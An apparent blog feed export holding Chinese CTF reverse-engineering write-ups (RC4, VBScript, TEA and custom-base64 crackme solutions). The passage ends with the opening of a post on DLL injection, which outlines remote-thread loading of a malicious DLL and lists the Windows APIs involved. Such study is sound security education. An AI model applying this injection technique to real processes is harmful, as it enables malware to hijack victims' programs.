*</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">strr = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&#x27;./chall.py&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    strr = f.read()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&quot;&quot;&quot;\s*(.*?)\s*&quot;&quot;&quot;&#x27;</span>, re.DOTALL) </span><br><span class="line">    matches = pattern.findall(strr.decode())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;b32decode&#x27;</span> <span class="keyword">in</span> strr:</span><br><span class="line">        strr = b32decode(matches[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">b&#x27;b64decode&#x27;</span> <span class="keyword">in</span> strr:</span><br><span class="line">        strr = b64decode(matches[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">b&#x27;b85decode&#x27;</span> <span class="keyword">in</span> strr:</span><br><span class="line">        strr = b85decode(matches[<span class="number">0</span>])    </span><br><span class="line">    <span class="keyword">elif</span> <span class="string">b&#x27;a85decode&#x27;</span> <span class="keyword">in</span> strr:</span><br><span class="line">        strr = a85decode(matches[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./res.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(strr)</span><br></pre></td></tr></table></figure><p>输出为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="literal">True</span></span><br><span class="line">d=<span class="built_in">len</span></span><br><span class="line">G=<span class="built_in">list</span></span><br><span class="line">g=<span class="built_in">range</span></span><br><span class="line">s=<span class="built_in">next</span></span><br><span class="line">R=<span class="built_in">bytes</span></span><br><span class="line">o=<span class="built_in">input</span></span><br><span class="line">Y=<span class="built_in">print</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">l</span>(<span class="params">S</span>):</span><br><span class="line"> i=<span class="number">0</span></span><br><span class="line"> j=<span class="number">0</span></span><br><span class="line"> <span class="keyword">while</span> a:</span><br><span class="line">  i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">  j=(j+S[i])%<span class="number">256</span></span><br><span class="line">  S[i],S[j]=S[j],S[i]</span><br><span class="line">  K=S[(S[i]+S[j])%<span class="number">256</span>]</span><br><span class="line">  <span class="keyword">yield</span> K</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">N</span>(<span class="params">key,O</span>):</span><br><span class="line"> I=d(key)</span><br><span class="line"> S=G(g(<span class="number">256</span>))</span><br><span class="line"> j=<span class="number">0</span></span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> g(<span class="number">256</span>):</span><br><span class="line">  j=(j+S[i]+key[i%I])%<span class="number">256</span></span><br><span class="line">  S[i],S[j]=S[j],S[i]</span><br><span class="line"> z=l(S)</span><br><span class="line"> n=[]</span><br><span class="line"> <span class="keyword">for</span> k <span class="keyword">in</span> O:</span><br><span class="line">  n.append(k^s(z)+<span class="number">2</span>)</span><br><span class="line"> <span class="keyword">return</span> R(n)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">E</span>(<span class="params">s,parts_num</span>):</span><br><span class="line"> Q=d(s.decode())</span><br><span class="line"> S=Q//parts_num</span><br><span class="line"> u=Q%parts_num</span><br><span class="line"> W=[]</span><br><span class="line"> j=<span class="number">0</span></span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> g(parts_num):</span><br><span class="line">  T=j+S</span><br><span class="line">  <span class="keyword">if</span> u&gt;<span class="number">0</span>:</span><br><span class="line">   T+=<span class="number">1</span></span><br><span class="line">   u-=<span class="number">1</span></span><br><span class="line">  W.append(s[j:T])</span><br><span class="line">  j=T</span><br><span class="line"> <span class="keyword">return</span> W</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> L=o(<span class="string">&#x27;input the flag: &gt;&gt;&gt; &#x27;</span>).encode()</span><br><span class="line"> <span class="keyword">assert</span> d(L)%<span class="number">2</span>==<span class="number">0</span>,<span class="string">&#x27;flag length should be even&#x27;</span></span><br><span class="line"> t=<span class="string">b&#x27;v3ry_s3cr3t_p@ssw0rd&#x27;</span></span><br><span class="line"> O=E(L,<span class="number">2</span>)</span><br><span class="line"> U=[]</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> O:</span><br><span class="line">  U.append(N(t,i).<span class="built_in">hex</span>())</span><br><span class="line"> <span class="keyword">if</span> U==[<span class="string">&#x27;1796972c348bc4fe7a1930b833ff10a80ab281627731ab705dacacfef2e2804d74ab6bc19f60&#x27;</span>,2ea999141a8cc9e47975269340c177c726a8aa732953a66a6af183bcd9cec8464a<span class="string">&#x27;]:</span></span><br><span class="line"><span class="string">  Y(&#x27;</span>Congratulations! You got the flag!<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"> else:</span></span><br><span class="line"><span class="string">  Y(&#x27;</span>Wrong flag!<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/09/DmEqGt8dscFrKgQ.png" alt="image-20241109172858511"></p><p>发现这里少了一个\‘,补上,然后看看感觉是RC4，所以直接把结果在调试的时候粘贴进去解出来得到</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">666</span><span class="keyword">c</span><span class="number">61677</span>b<span class="number">7468456e5</span>f<span class="number">495</span>f<span class="number">4361355</span>f<span class="number">42455</span>f<span class="number">596</span>f<span class="number">55525</span>f<span class="number">4</span>f<span class="number">6e6</span><span class="keyword">c</span><span class="number">375</span>f<span class="number">45786543557469366e5</span>f<span class="number">536</span>f<span class="number">5</span>f<span class="number">5573655</span>f<span class="number">6</span>d<span class="number">335</span>f<span class="number">74305</span>f<span class="number">52306e5</span>f<span class="number">744831375</span>f<span class="number">45783343757469306e7</span>d</span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;thEn_I_Ca5_BE_YoUR_Onl7_ExeCUti6n_So_Use_m3_t0_R0n_tH17_Ex3Cuti0n&#125;</span></span><br></pre></td></tr></table></figure><h3 id="joyVBS">joyVBS</h3><p>和上一个题的思路</p><p>开头添加</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dim fso, <span class="keyword">file</span></span><br><span class="line"><span class="keyword">Set</span> fso = CreateObject(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> <span class="keyword">file</span> = fso.CreateTextFile(<span class="string">&quot;output.txt&quot;</span>, <span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>改为file.Write</p><p>得到文件</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">MsgBox <span class="string">&quot;VBScript, often abbreviated as VBS, is an event-driven programming language developed by Microsoft, primarily used for scripting in the Windows environment.&quot;</span></span><br><span class="line">MsgBox <span class="string">&quot;It is based on the Visual Basic programming language and is designed to be simple and easy to use, especially for those familiar with the BASIC programming language.&quot;</span></span><br><span class="line">MsgBox <span class="string">&quot;And for me, it is the first programming language that I&#x27;ve leart&quot;</span></span><br><span class="line">MsgBox <span class="string">&quot;Hackers! Have fun with this VBS challenge!&quot;</span></span><br><span class="line">flag = <span class="built_in">InputBox</span>(<span class="string">&quot;Enter the FLAG:&quot;</span>, <span class="string">&quot;Hack for fun&quot;</span>)</span><br><span class="line">wefbuwiue = <span class="string">&quot;NalvN3hKExBtALBtInPtNHTnKJ80L3JtqxTboRA/MbF3LnT0L2zHL2SlqnPtJLAnFbIlL2SnFT8lpzFzA2JHrRTiNmT9&quot;</span></span><br><span class="line"></span><br><span class="line">qwfe = <span class="number">9</span>+<span class="number">2</span>+<span class="number">2</span>+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> Base64Decode(base64EncodedString)</span><br><span class="line">    <span class="keyword">Dim</span> xml, elem</span><br><span class="line">    <span class="keyword">Set</span> xml = <span class="built_in">CreateObject</span>(<span class="string">&quot;MSXML2.DOMDocument&quot;</span>)</span><br><span class="line">    <span class="keyword">Set</span> elem = xml.createElement(<span class="string">&quot;tmp&quot;</span>)</span><br><span class="line">    elem.dataType = <span class="string">&quot;bin.base64&quot;</span> </span><br><span class="line">    elem.text = base64EncodedString </span><br><span class="line">    <span class="keyword">Dim</span> stream</span><br><span class="line">    <span class="keyword">Set</span> stream = <span class="built_in">CreateObject</span>(<span class="string">&quot;ADODB.Stream&quot;</span>)</span><br><span class="line">    stream.Type = <span class="number">1</span> <span class="comment">&#x27;Binary</span></span><br><span class="line">    stream.Open</span><br><span class="line">    stream.Write elem.nodeTypedValue </span><br><span class="line">    stream.Position = <span class="number">0</span></span><br><span class="line">    stream.Type = <span class="number">2</span> <span class="comment">&#x27;Text</span></span><br><span class="line">    stream.Charset = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">    Base64Decode = stream.ReadText</span><br><span class="line">    stream.Close</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"><span class="keyword">Function</span> Caesar(str,offset)</span><br><span class="line"><span class="keyword">Dim</span> length,char,i</span><br><span class="line">Caesar = <span class="string">&quot;&quot;</span></span><br><span class="line">length = <span class="built_in">Len</span>(str)</span><br><span class="line"><span class="keyword">For</span> i = <span class="number">1</span> <span class="keyword">To</span> length</span><br><span class="line">char = <span class="built_in">Mid</span>(str,i,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">If</span> char &gt;= <span class="string">&quot;A&quot;</span> <span class="keyword">And</span> char &lt;= <span class="string">&quot;Z&quot;</span> <span class="keyword">Then</span></span><br><span class="line">char = <span class="built_in">Asc</span>(<span class="string">&quot;A&quot;</span>) + (<span class="built_in">Asc</span>(char) - <span class="built_in">Asc</span>(<span class="string">&quot;A&quot;</span>) + offset) Mod <span class="number">26</span></span><br><span class="line">Caesar = Caesar &amp; <span class="built_in">Chr</span>(char)</span><br><span class="line"><span class="keyword">ElseIf</span> char &gt;= <span class="string">&quot;a&quot;</span> <span class="keyword">And</span> char &lt;= <span class="string">&quot;z&quot;</span> <span class="keyword">Then</span></span><br><span class="line">char = <span class="built_in">Asc</span>(<span class="string">&quot;a&quot;</span>) + (<span class="built_in">Asc</span>(char) - <span class="built_in">Asc</span>(<span class="string">&quot;a&quot;</span>) + offset) Mod <span class="number">26</span></span><br><span class="line">Caesar = Caesar &amp; <span class="built_in">Chr</span>(char)</span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">Caesar = Caesar &amp; char</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> flag = Base64Decode(Caesar(wefbuwiue, <span class="number">26</span>-qwfe)) <span class="keyword">Then</span></span><br><span class="line">    MsgBox <span class="string">&quot;Congratulations! Correct  FLAG!&quot;</span></span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">    MsgBox <span class="string">&quot;Wrong flag.&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br></pre></td></tr></table></figure><p>尝试直接输出Base64Decode</p><p><img src="https://s2.loli.net/2024/11/09/6BCL3jP7U4QIdNV.png" alt="image-20241109173144980"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;VB3_1s_S0_e1sY_4_u_r1gh3?btw_1t_iS_a1s0_Us3Fu1_a3D_1nTe3eSt1ng!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="re5">re5</h3><p>调试可以看出，每次的SEH都使用rand()修改了delta，</p><p><img src="https://s2.loli.net/2024/11/09/owkBQxFVCJLnyUp.png" alt="image-20241109173349124"></p><p>这里可以看到srand初始化是0，那么直接输出每次的delta即可，同时key不是1234而是2233很怪不知道为什么</p><p>然后直接写脚本解即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> delta[] = &#123; <span class="number">0x26</span>, <span class="number">0x1e27</span>, <span class="number">0x52f6</span>, <span class="number">0x985</span>, <span class="number">0x2297</span>, <span class="number">0x2e15</span>, <span class="number">0x20ad</span>, <span class="number">0x7e1d</span>, <span class="number">0x28d2</span>, <span class="number">0x7794</span>, <span class="number">0x16dd</span>, <span class="number">0x6dc4</span>, <span class="number">0x476</span>, <span class="number">0x119</span>, <span class="number">0x5039</span>, <span class="number">0x3e31</span>, <span class="number">0x22f1</span>, <span class="number">0x66ad</span>, <span class="number">0xbb5</span>, <span class="number">0x3958</span>, <span class="number">0x51f0</span>, <span class="number">0x7c93</span>, <span class="number">0x5497</span>, <span class="number">0x6532</span>, <span class="number">0x4819</span>, <span class="number">0x52b</span>, <span class="number">0x70d1</span>, <span class="number">0x8c0</span>, <span class="number">0x25fd</span>, <span class="number">0x7e16</span>, <span class="number">0x98e</span>, <span class="number">0x24e</span>, <span class="number">0x348</span>, <span class="number">0x489b</span>, <span class="number">0x420b</span>, <span class="number">0x52f5</span>, <span class="number">0x5c3b</span>, <span class="number">0x3149</span>, <span class="number">0x30a8</span>, <span class="number">0x363</span>, <span class="number">0x735d</span>, <span class="number">0x1ade</span>, <span class="number">0x6e3f</span>, <span class="number">0x45df</span>, <span class="number">0x7b6d</span>, <span class="number">0x5068</span>, <span class="number">0x2fb4</span>, <span class="number">0x7987</span>, <span class="number">0x1d9a</span>, <span class="number">0x42aa</span>, <span class="number">0x1dcd</span>, <span class="number">0x72dc</span>, <span class="number">0x2ff7</span>, <span class="number">0x34c1</span>, <span class="number">0x5f44</span>, <span class="number">0x2d81</span>, <span class="number">0x3029</span>, <span class="number">0x1c08</span>, <span class="number">0x91b</span>, <span class="number">0x4b40</span>, <span class="number">0x5662</span>, <span class="number">0x3738</span>, <span class="number">0x6930</span>, <span class="number">0x44e</span>, <span class="number">0x5494</span>, <span class="number">0x20d4</span>, <span class="number">0x5f11</span>, <span class="number">0x6cd0</span>, <span class="number">0x15de</span>, <span class="number">0x60c4</span>, <span class="number">0x3711</span>, <span class="number">0x339d</span>, <span class="number">0x124b</span>, <span class="number">0x413f</span>, <span class="number">0x3b9c</span>, <span class="number">0x3e46</span>, <span class="number">0xabb</span>, <span class="number">0x6aef</span>, <span class="number">0x70c7</span>, <span class="number">0x4654</span>, <span class="number">0x4121</span>, <span class="number">0xc50</span>, <span class="number">0x2e2b</span>, <span class="number">0x5bd0</span>, <span class="number">0xef</span>, <span class="number">0x105a</span>, <span class="number">0xaf4</span>, <span class="number">0x7109</span>, <span class="number">0xbcf</span>, <span class="number">0x285f</span>, <span class="number">0x5035</span>, <span class="number">0x5391</span>, <span class="number">0x3e94</span>, <span class="number">0x2d36</span>, <span class="number">0x657f</span>, <span class="number">0x3689</span>, <span class="number">0x270</span>, <span class="number">0x1b99</span>, <span class="number">0x6bb1</span>, <span class="number">0x321e</span>, <span class="number">0x5e67</span>, <span class="number">0x2fcc</span>, <span class="number">0x7a11</span>, <span class="number">0x5c54</span>, <span class="number">0x3d03</span>, <span class="number">0x647f</span>, <span class="number">0x319c</span>, <span class="number">0x5f03</span>, <span class="number">0x3a4a</span>, <span class="number">0x58f6</span>, <span class="number">0x1a9b</span>, <span class="number">0x2f1e</span>, <span class="number">0xded</span>, <span class="number">0x6267</span>, <span class="number">0x77</span>, <span class="number">0x493b</span>, <span class="number">0x65c2</span>, <span class="number">0x4ca4</span>, <span class="number">0x3fce</span>, <span class="number">0x1750</span>, <span class="number">0x4474</span>, <span class="number">0xdf9</span>, <span class="number">0x3ac6</span>, <span class="number">0x63bb</span>, <span class="number">0x387a</span>, <span class="number">0x7258</span>, <span class="number">0x67a2</span>, <span class="number">0x7d86</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> sum[] = &#123; <span class="number">0x6f0f9</span>, <span class="number">0x7d7e9</span>, <span class="number">0x76142</span>, <span class="number">0x873fc</span> &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">TEA_encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* v, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span>* k)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> delta = <span class="number">0x61C88647</span>, sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">delta = rand();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x, &quot;</span>, delta);</span><br><span class="line">sum += delta;</span><br><span class="line">v0 += (k[<span class="number">1</span>] + (v1 &gt;&gt; <span class="number">5</span>)) ^ (sum + v1) ^ (k[<span class="number">0</span>] + (v1 &lt;&lt; <span class="number">4</span>));</span><br><span class="line">v1 += (k[<span class="number">3</span>] + (v0 &gt;&gt; <span class="number">5</span>)) ^ (sum + v0) ^ (k[<span class="number">2</span>] + (v0 &lt;&lt; <span class="number">4</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v[<span class="number">0</span>] = v0;</span><br><span class="line">v[<span class="number">1</span>] = v1;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>, sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">TEA_decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* v, <span class="type">int</span>* k, <span class="type">int</span> round)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">31</span>; i &gt; <span class="number">-1</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">v1 -= (k[<span class="number">3</span>] + (v0 &gt;&gt; <span class="number">5</span>)) ^ (sum[round] + v0) ^ (k[<span class="number">2</span>] + (v0 &lt;&lt; <span class="number">4</span>));</span><br><span class="line">v0 -= (k[<span class="number">1</span>] + (v1 &gt;&gt; <span class="number">5</span>)) ^ (sum[round] + v1) ^ (k[<span class="number">0</span>] + (v1 &lt;&lt; <span class="number">4</span>));</span><br><span class="line">sum[round] -= delta[round * <span class="number">32</span> + i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v[<span class="number">0</span>] = v0;</span><br><span class="line">v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">srand(<span class="number">0</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> last[<span class="number">9</span>] = &#123;</span><br><span class="line"><span class="number">0xEA2063F8</span>, <span class="number">0x8F66F252</span>, <span class="number">0x902A72EF</span>, <span class="number">0x411FDA74</span>, <span class="number">0x19590D4D</span>, <span class="number">0xCAE74317</span>, <span class="number">0x63870F3F</span>, <span class="number">0xD753AE61</span>,<span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> key[<span class="number">4</span>] = &#123; <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//for (int i = 0; i &lt; 8; i += 2)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//TEA_encrypt(&amp;last[i], key);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> round = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">6</span>; i &gt; <span class="number">-1</span>; i -= <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">TEA_decrypt(&amp;last[i], key, round);</span><br><span class="line">round--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nDecrypted values:\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%X 0x%X\n&quot;</span>, last[i], last[i + <span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>*)last);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d<span class="number">555</span>ce<span class="number">75</span>ec<span class="number">293</span><span class="keyword">c</span><span class="number">8</span>ed<span class="number">232</span>d<span class="number">83</span>dffb<span class="number">0</span>ff<span class="number">82</span></span><br></pre></td></tr></table></figure><h3 id="Rafflesia">Rafflesia</h3><p>main里面有花，去了，然后看到tls里有反调，改跳转跳过</p><p><img src="https://s2.loli.net/2024/11/09/Y6K7bgpdWO32ANG.png" alt="image-20241109175055679"></p><p>这个花不会去，但是大概能看懂</p><p>好像就是一个base64变表</p><p>直接调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HElRNYGmBOMWnbDvUCgcpu1QdPqJIS+iTry39KXse4jLh/x26Ff5Z7Vokt8wzAa0</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">last = <span class="string">b&#x27;H@^jHwpsH)[jH&#123;M/\\tBBK_|-O&#123;W.iJZ7\\)|~zaB^H+Lwv&#123;SS|-j@\\_[Y&#x27;</span></span><br><span class="line">last = xor(last,<span class="number">0x18</span>).decode()</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line">table = <span class="string">&#x27;HElRNYGmBOMWnbDvUCgcpu1QdPqJIS+iTry39KXse4jLh/x26Ff5Z7Vokt8wzAa0&#x27;</span></span><br><span class="line">otable = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> last:</span><br><span class="line">    result += otable[table.index(ch)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>((b64decode(result)))</span><br><span class="line"><span class="comment"># flag&#123;8edae458-4tf3-2ph2-9f26-1f8719ec8f8d&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DLL反射注入</title>
      <link href="/posts/76312a14.html"/>
      <url>/posts/76312a14.html</url>
      
        <content type="html"><![CDATA[<h2 id="远程线程注入">远程线程注入</h2><p>之前最普通的方法是创建远程线程注入DLL，具体流程是<br>注入器找到目标进程句柄，申请一段内存，写入DLL路径，然后创建远程线程，将LoadLibrary作为函数指针传入，把DLL路径作为参数进行执行，从而加载我们的恶意DLL</p><p>需要的WindowsAPI如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//CreateToolhelp32Snapshot();//枚举进程,然后比较进程名pe.szExeFile和已知字符串获取句柄</span></span><br><span class="line">OpenProcess();<span class="comment">//通过pid获取句柄</span></span><br><span class="line"></span><br><span class="line">VirtualAllocEx();<span class="comment">//申请空间</span></span><br><span class="line">WriteProcessMemory();<span class="comment">//写入字符串</span></span><br><span class="line">CreatRemoteThread();<span class="comment">//创建线程</span></span><br><span class="line"></span><br><span class="line">LoadLibrary();<span class="comment">//装载DLL</span></span><br></pre></td></tr></table></figure><h2 